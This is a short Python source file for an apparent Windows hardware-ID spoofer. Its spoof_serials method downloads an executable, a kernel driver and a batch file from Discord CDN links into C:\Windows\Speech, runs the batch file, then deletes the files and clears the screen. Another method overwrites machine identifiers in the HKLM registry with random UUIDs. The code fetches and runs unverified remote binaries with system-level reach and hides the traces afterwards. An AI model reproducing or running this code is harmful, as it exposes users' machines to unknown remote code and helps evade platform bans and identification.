import string
import random
import subprocess
import requests
import uuid
import os
from winreg import *

class Helper:
    @staticmethod
    def random_id(length):
        chars = string.ascii_uppercase + "0123456789"
        return ''.join(random.choice(chars) for _ in range(length))
    
    @staticmethod
    def spoof_serials():
        urls = [
            "https://cdn.discordapp.com/attachments/879451485975482399/1009556147969196052/AMIDEWINx64.EXE",
            "https://cdn.discordapp.com/attachments/879451485975482399/1009557572052852888/amifldrv64.sys",
            "https://cdn.discordapp.com/attachments/879451485975482399/1009556159402889236/ChangeDatShit.bat"
        ]

        for url in urls:
            file_name = url.split("/")[-1]
            response = requests.get(url)
            with open(f"C:\\Windows\\Speech\\{file_name}", "wb") as file:
                file.write(response.content)

        subprocess.run(["C:\\Windows\\Speech\\ChangeDatShit.bat"])
        os.remove("C:\\Windows\\Speech\\AMIDEWINx64.EXE")
        os.remove("C:\\Windows\\Speech\\amifldrv64.sys")
        os.remove("C:\\Windows\\Speech\\ChangeDatShit.bat")
        os.system("cls")

    @staticmethod
    def spoof_uniq(path, name):
        value = str(uuid.uuid4())
        with OpenKey(HKEY_LOCAL_MACHINE, path, 0, KEY_SET_VALUE | KEY_WOW64_64KEY) as key:
            SetValueEx(key, name, 0, REG_SZ, value)

    @staticmethod
    def find_id(path, name):
        with OpenKey(HKEY_LOCAL_MACHINE, path, 0, KEY_QUERY_VALUE | KEY_WOW64_64KEY) as key:
            value = QueryValueEx(key, name)[0]
            return f"{name} : {value}"

